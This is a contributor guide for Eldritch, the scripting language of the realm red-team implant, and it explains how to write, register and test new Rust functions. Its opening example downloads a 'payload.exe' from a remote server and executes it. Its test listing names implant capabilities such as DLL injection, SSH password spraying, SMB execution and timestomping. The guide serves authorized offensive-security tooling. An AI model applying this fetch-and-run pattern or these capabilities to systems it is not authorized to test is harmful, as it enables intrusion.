---
title: Eldritch
tags:
 - Dev Guide
description: Want to implement new functionality in the agent? Start here!
permalink: dev-guide/eldritch
---

# Overview
Eldritch expands the capability of realm agents allowing them to perform actions programmatically.
Not all tasks should be done through Eldritch though. Eldritch is meant to create the building blocks that operators can use during tests.
Creating a function that is too specific could limit it's usefulness to other users.

**For example**: if you want to download a file to a specific location, execute it, and return the functions result this should be chunked into separate `download`, and `execute` functions within Eldritch. The example use case should look like:

The Eldritch tome could look like this:
```python
file.download("http://fileserver.net/payload.exe", "C:/temp/")
sys.exec("C:/temp/payload.exe")
```

_Exceptions to the rule above exist if performing the activities requires the performance of rust._
_Eg. port scanning could be implemented using a for loop and `tcp_connect` however due to the performance demand of port scanning a direct implementation in rust makes more sense_

Want to contribute to Eldritch but aren't sure what to build check our ["good first issue" tickets.](https://github.com/KCarretto/realm/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)

# Creating a function

## What files should I modify to make an Eldritch function.
---
#### Documentation
`docs/_docs/user-guide/eldritch.md`
Add your function to the docs. Give your function a unique and descriptive name. Assign it to an Eldritch module.

Currently Eldritch has four modules your function can fall under:
* `file`: Is used for any on disk file processing.
* `pivot`: Is used to migrate to identify, and migrate between systems. The pivot module is also responsible for facilitating connectivity within an environment.
* `process`: Is used to manage running processes on a system.
* `sys`: Is used to check system specific configurations and start new processes.

If your function does not fall under a specific module reach out to the core developers about adding a new module or finding the right fit.

Specify the input and output according to the [Starlark types spec.](https://docs.rs/starlark/0.6.0/starlark/values/index.html)
If there are OS or edge case specific behaviors make sure to document them here. If there are limitations Eg. if a function doesn't use file streaming specify that it can't be used for large files.
Please add your function in alphabetical order this makes it easy to search by key words.
```markdown
### module.function
module.function(arg1: str, arg2: int, arg3: list) -> bool

The <b>module.function</b> describe your function and edge cases.
```

#### Eldritch definition
`implants/lib/eldritch/src/module.rs`
Add a function definition here, where `module.rs` is the name of the module you selected above. This is how the Eldritch language is made aware that your function exists.

Add the import for your functions implementation at the top, try to keep these in alphabetical order for readability.
Then add the function definition under the methods function
```rust
...
mod function_impl;
...
#[starlark_module]
fn methods(builder: &mut MethodsBuilder) {
...
    fn function(this: ModuleLibrary, arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<String> {
        if false { println!("Ignore unused this var. _this isn't allowed by starlark. {:?}", this); }
        function_impl::function(arg1, arg2, arg3)
    }
```

You may notice that some functions follow the pattern:
```rust
    fn function(this: ModuleLibrary, arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<NoneType> {
        if false { println!("Ignore unused this var. _this isn't allowed by starlark. {:?}", this); }
        function_impl::function(arg1, arg2, arg3)?;
        Ok(NoneType{})
    }
```
This pattern is only used for none type returns since we're returning Starlark None. Returning like this in the module file is more streamlined than having each module return a special starlark type.

### Eldritch Implementation
`implants/lib/eldritch/src/module/function_impl.rs`
Add your function implementation here, where `/module/` is the name of the module you selected above and `/function_impl.rs` is the name of your function with `_impl.rs` appended after it. This should match what's been put in the module file.
This file will contain the actual implementation, helper functions, and unit tests for your function.

Here's a template of how your code should look:
```rust
use anyhow::Result;

fn helper(argz: String) -> bool {
    // Do helper stuff
}

pub fn function(path: arg1: String, arg2: u8, arg3: Vec<String>) -> bool {
    // Do code stuff
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_function_basic() -> anyhow::Result<()>{
        // Setup
        // Run code
        // Check results
        assert_eq!(res, true)
    }

    #[test]
    fn test_function_negative() -> anyhow::Result<()>{
        // Setup
        // Run code
        // Check that expected failures occur
        assert_eq!(res, false)
    }

    #[test]
    fn test_function_helper() -> anyhow::Result<()>{
        // Setup
        // Run helper code
        // Check results
        assert_eq!(res, true)
    }

    // More tests! 🚀
}
```

### `eldritch/lib.rs` tests

Lastly you'll need to add your function to the `eldritch/lib.rs` integration test.

```rust
    #[test]
    fn test_library_bindings() {
        let globals = get_eldritch().unwrap();
        let mut a = Assert::new();
        a.globals(globals);
        a.all_true(
            r#"
dir(file) == ["append", "compress", "copy", "download", "exists", "hash", "is_dir", "is_file", "mkdir", "read", "remove", "rename", "replace", "replace_all", "template", "timestomp", "write"]
dir(process) == ["kill", "list", "name"]
dir(sys) == ["dll_inject", "exec", "is_linux", "is_macos", "is_windows", "shell"]
dir(pivot) == ["arp_scan", "bind_proxy", "ncat", "port_forward", "port_scan", "smb_exec", "ssh_exec", "ssh_password_spray"]
dir(assets) == ["copy","list"]
"#,
        );
    }
```

Add your function in alphabetical order to the list of the module it belongs to.
This test is done to ensure that all functions are available to the interpreter.

**Implementation tips:**
* If working with files & network connections use streaming to avoid issues with large files.
* If your function depends on resources outside of eldritch (Eg. files, network, etc.) implement helper function that allow the user to proactively test for errors. If your function requires a specific type of file to work consider implementing a function like `is_file` or `is_lnk`.

### Testing
Testing can be really daunting especially with complex system functions required by security professionals.
If you have any questions or hit any road blocks please reach out we'd love to help, also feel free to open a draft PR with what you have and mark it with the `help wanted` tag.
Testing isn't meant to be a barrier to contributing but instead a safety net so you know your code doesn't affect other systems. If it's become a blocker please reach out so we can help 🙂

**Goals**
1. Cross platform
2. Test basic functionality.
3. Test negative cases.
4. Prevent regression.
5. Test edge cases.

**Tips**
Any methods added to the Eldritch Standard Library should have tests collocated in the method's `<function>_impl.rs` file. Here are a few things to keep in mind:
* Tests should be cross platform
    * Rely on [NamedTempFile](https://docs.rs/tempfile/1.1.1/tempfile/struct.NamedTempFile.html) for temporary files
    * Rely on [path.join](https://doc.rust-lang.org/stable/std/path/struct.Path.html) to construct OS-agnostic paths
* Chunk out implementation code into discrete helper functions so each can be tested individually.

### Example PR for an Eldritch method.
Check out [this basic example of a PR](https://github.com/KCarretto/realm/pull/231) to see what they should look like.
This PR implements the `sys.hostname` function into Eldritch and is a simple example of how to get started.

# OS Specific functions
---
Limit changes to the implementation file.

OS specific restrictions should be done in the **Eldritch Implementation** you should only have to worry about it in your: `function_impl.rs`.
This ensures that all functions are exposed in every version of the Eldritch language.
To prevent errors and compiler warnings use the `#[cfg(target_os = "windows")]` conditional compiler flag to suppress OS specific code.
For all non supported OSes return an error with a message explaining which OSes are supported.
**Example**
```rust
    #[cfg(not(target_os = "windows"))]
    return Err(anyhow::anyhow!("This OS isn't supported by the dll_inject function.\nOnly windows systems are supported"));
```

# Notes about using dictionary type `Dict`
---
The `Dict` type requires dynamic memory allocation in starlark. In order to achieve this we can leverage the `starlark::Heap` and push entries onto it. It's pretty simple to implement and starlark does some magic to streamline the process. To make the heap available to your function simply add it as an argument to your function.

## Different function decelerations
`implants/lib/eldritch/src/module.rs`

```rust
    fn function<'v>(this: SysLibrary, starlark_heap: &'v Heap, arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<Dict<'v>> {
```

`implants/lib/eldritch/src/module/function_impl.rs`
```rust
pub fn function(starlark_heap: &Heap, arg1: String, arg2: u8, arg3: Vec<String>) -> Result<Dict> {
```

## Split starlark boilerplate and function implementation
One note is when working with starlark `Dict` types it preferred that a `handle_` function be implemented which returns a real data type and that data type is translated from the rust data type to starlark `Dict` in the `function` for example:

```rust
struct OsInfo {
    arch:           String,
}

fn handle_get_os() -> Result<OsInfo> {
    return Ok(OsInfo {
        arch:           whoami::arch().to_string(),
    });
}

pub fn get_os(starlark_heap: &Heap) -> Result<Dict> {

    let cmd_res = handle_get_os()?;

    let res = SmallMap::new();
    let mut dict_res = Dict::new(res);
    let arch_value = starlark_heap.alloc_str(&cmd_res.arch);
    dict_res.insert_hashed(const_frozen_string!("arch").to_value().get_hashed().unwrap(), arch_value.to_value());
    Ok(dict_res)
}
```

Splitting the code to handle inserting data into the `Dict` helps keep the code organized and also allows others looking to eldritch as an example of how things can be implemented to more clearly delineate where the technique stops and the eldritch boilerplate begins.

## Testing
When testing you can pass a clean heap from your test function into your new function.
```rust
...
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_function() -> anyhow::Result<()>{
        let test_heap = Heap::new();
        let res = function(&test_heap)?;
        assert!(res.contains("success"));
    }
}
```

## Example PR
Example of how to return a dictionary:
PR #[238](https://github.com/KCarretto/realm/pull/238/files) This PR implements the `sys.get_os` function which returns a dictionary of string types.

# Notes about asynchronous Eldritch code
---
### Async example
In order to run concurrent tasks we need to build an asynchronous function. This is useful if you're building a function that needs to do two things at once or that can benefit from running discrete tasks in parallel.

The starlark bindings we're using to create Eldritch are not asynchronous therefore the Eldritch function itself cannot be asynchronous.
To get around this we use the [`tokio::runtime::Runtime.block_on()`](https://docs.rs/tokio/latest/tokio/runtime/struct.Runtime.html#method.block_on) function in conjunction with two asynchronous helpers.

We'll create the following three functions to manage concurrent tasks:
* `pub fn function` - Eldritch function implementation which will implement the `tokio::runtime::Runtime.block_on()` function.
* `async fn handle_function` - Async helper function that will start, track, and join async tasks.
* `async fn run_function` - Async function runner that gets spawned by the `handle_function` function.

An example of how you might run multiple concurrent tasks asynchronously.
```rust
// Async handler for Eldritch function
async fn run_function(argstr: String) -> Result<String> {
    // Do async stuff
}

async fn handle_function(arg1: Vec<String>) -> Result<Vec<String>> {
    let mut result: Vec<String> = Vec::new();
    // This vector will hold the handles to our futures so we can retrieve the results when they finish.
    let mut all_result_futures: Vec<_> = vec![];
    // Iterate over all values in arg1.
    for value in arg1 {
        // Iterate over all listed ports.
        let resulting_future = run_function(value);
        all_result_futures.push(task::spawn(resulting_future));
    }

    // Await results of each task.
    // We are not acting on scan results independently so it's okay to loop through each and only return when all have finished.
    for task in all_result_futures {
        match task.await? {
            Ok(res) => result.push(res),
            Err(err) => return anyhow::private::Err(err),
        };
    }

    Ok(result)
}

// Non-async wrapper for our async scan.
pub fn function(arg1: Vec<String>) -> Result<Vec<String>> {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();

    let response = runtime.block_on(
        handle_function(target_cidrs)
    );

    match response {
        Ok(result) => Ok(result),
        Err(_) => return response,
    }
}

// Testing ...
```

**Implementation tips:**
* If running a lot of concurrent tasks the system may run out of open file descriptors. Either handle this error with a wait and retry, or proactively rate limit your tasks well below the default limits.


### Testing async code requires some additional work
You'll need to write tests for your synchronous and asynchronous code.
Async tests will usually start two threads one for your function and one that mocks (or reimplements) the feature you're testing against.
For example if testing a port scanner or netcat like function you'll want to run a test port listener for your feature to connect to.
Network ports test servers have been implemented in `pivot.ncat` and `pivot.port_scan` an example SSH server has been implemented in `pivot.ssh_exec`.

Tests for async functions may look like this:
```rust
// Command implementation code.
// ....

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::task;

    // Example of how to run two functions concurrently.
    // This can be useful in for testing something like a tcp connect function
    // where a test listener needs to be running too.
    #[tokio::test]
    async fn test_function_async_basic() -> anyhow::Result<()> {
        let expected_response_1 = String::from("Hello world!");
        let expected_response_2 = String::from("Good bye!");

        let task1_handler = task::spawn(
            setup_task()
        );

        let task2_handler = task::spawn(
            handle_function(["Good", "bye!"])
        );

        let (task1_handler_res, task2_handler_res) = tokio::join!(task1_handler,task2_handler);

        assert_eq!(expected_response_1, task1_handler_res.unwrap());
        assert_eq!(expected_response_2, task2_handler_res.unwrap());
    }

    // Make sure to test the synchronous handler for the test too.
    // This makes sure that our Eldritch implementation correctly passes
    // the function call from synchronous space to asynchronous space.
    #[test]
    fn test_function_not_async() -> anyhow::Result<()> {
        //Mostly just testing that the code runs.
        //Without an async setup function our code will likely return a fail state.
        //If that's the case test for that state.
        let response = function(["Test", "123"])?;
        assert_eq!(response, false);
    }
}
```

### Async PR example
An example of how async can be used in testing: [PR for the Eldritch `pivot.ncat` implementation](https://github.com/KCarretto/realm/pull/44/files).

An example of testing async functions with multiple concurrent functions: [PR for the Eldritch `pivot.port_scan` implementation](https://github.com/KCarretto/realm/pull/45/files).
